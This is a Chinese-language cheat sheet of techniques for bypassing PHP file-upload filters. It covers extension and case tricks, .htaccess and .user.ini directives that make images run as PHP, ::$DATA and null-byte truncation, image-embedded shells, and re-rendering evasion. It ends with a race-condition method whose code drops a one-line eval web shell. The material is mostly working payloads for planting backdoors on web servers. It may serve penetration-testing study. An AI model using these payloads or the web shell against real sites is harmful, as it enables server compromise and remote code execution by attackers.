## 二. 绕过

### 大小写绕过

shell.PhP

### 空格绕过

```
shell.php 
```

### 文件名特性绕过

```
shell.php5
```

### .htaccess 分布式配置文件

```
AddType application/x-httpd-php .jpg .txt 
```

### .user.ini配置文件

```
.user.ini 

auto_prepend_file=111.jpg

所有php文件执行前，都要自动包含111.jpg文件里面的php代码
```

### 加.绕过

```
shell.php. .
```

### ::$DATA绕过

```
shell.php::$DATA
访问时如果后缀名带有::$DATA，先将其去掉再访问
```

### 双写绕过

```
如果说网站有去除关键字时，可以尝试双写绕过
shell.pphphp
```

### 00截断

```
%00截断的条件：php版本要小于5.3.4 修改php.ini配置文件中的magic_quotes_gpc为OFF状态

```

### 图片马绕过

```
cat shell.php >> h
```

### 二次渲染

```
可以利用vscode编辑器安装hex-editor工具进行插入恶意语句
首先上传正常的gif图片，复制渲染后的图片
利用hex-editor打开图片，插入恶意语句
重新上传，利用文件包含漏洞进行解析。
```

### 条件竞争绕过

```
生成后门的代码
<?PHP fputs(fopen('hello.php','w'),'<?php @eval($_POST[cool])?>');?>

如果说上传文件需要先临时保存到服务器，然后在进行判断文件是否合法，再进行删除
在这种情况下，可以利用burp的爆破模块，进行攻击，在判断上传文件是否合法时，利用条件竞争先访问上传文件，进行生成后门的操作。
利用此攻击手法达到绕过的目的。
还可以利用apache解析+条件竞争进行绕过，
apache解析特性，但无法解析时，会向左进行解析。
```
